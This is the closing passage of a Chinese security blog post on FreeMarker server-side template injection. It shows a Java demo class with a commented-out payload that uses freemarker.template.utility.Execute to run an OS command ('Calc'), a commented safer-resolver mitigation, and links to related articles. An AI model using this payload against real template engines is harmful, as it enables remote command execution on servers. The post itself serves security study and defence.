+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.ssti.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> freemarker.cache.StringTemplateLoader;</span><br><span class="line"><span class="keyword">import</span> freemarker.core.TemplateClassResolver;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Configuration;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FreeMarkerSSTI_Safe</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置模板</span></span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="comment">// String poc =&quot;&lt;#assign aaa=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; aaa(\&quot;Calc\&quot;) &#125;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span><span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="type">StringTemplateLoader</span> <span class="variable">stringLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTemplateLoader</span>();</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        stringLoader.putTemplate(<span class="string">&quot;name&quot;</span>,poc);</span><br><span class="line">        cfg.setTemplateLoader(stringLoader);</span><br><span class="line">        <span class="comment">// cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span></span><br><span class="line">        <span class="comment">//处理解析模板</span></span><br><span class="line">        <span class="type">Template</span> <span class="variable">Template_name</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">stringWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line"></span><br><span class="line">        Template_name.process(Template_name,stringWriter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16217471.html">https://www.cnblogs.com/nice0e3/p/16217471.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4846?time__1311=n4+xnD0D9DBDy7QDOiD/je5RDRrZp7QWDIrD&alichlgref=https://www.cnblogs.com/#toc-1">Freemarker模板注入 Bypass - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/12/28/FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#more">FreeMarker模板注入 | ycx’s blog (ilikeoyt.github.io)</a>o(╥﹏╥)o tql我的哥</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/01/11/cve-2023-4450/" rel="prev" title="cve-2023-4450">
+                  <i class="fa fa-angle-left"></i> cve-2023-4450
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" rel="next" title="这是我的第一篇文章">
+                  这是我的第一篇文章 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baicany</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
+</html>
